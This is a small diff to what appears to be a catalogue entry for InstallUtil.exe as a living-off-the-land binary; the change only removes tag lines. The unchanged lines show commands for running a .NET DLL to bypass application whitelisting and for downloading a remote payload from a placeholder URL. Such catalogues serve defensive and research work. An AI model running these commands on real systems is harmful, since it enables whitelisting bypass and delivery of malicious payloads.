@@ -14,7 +14,6 @@ Commands:
     Tags:
       - Execute: .NetDLL
       - Execute: .NetEXE
-      - Input: Custom Format
   - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
@@ -25,7 +24,6 @@ Commands:
     Tags:
       - Execute: .NetDLL
       - Execute: .NetEXE
-      - Input: Custom Format
   - Command: InstallUtil.exe https://example.com/payload
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
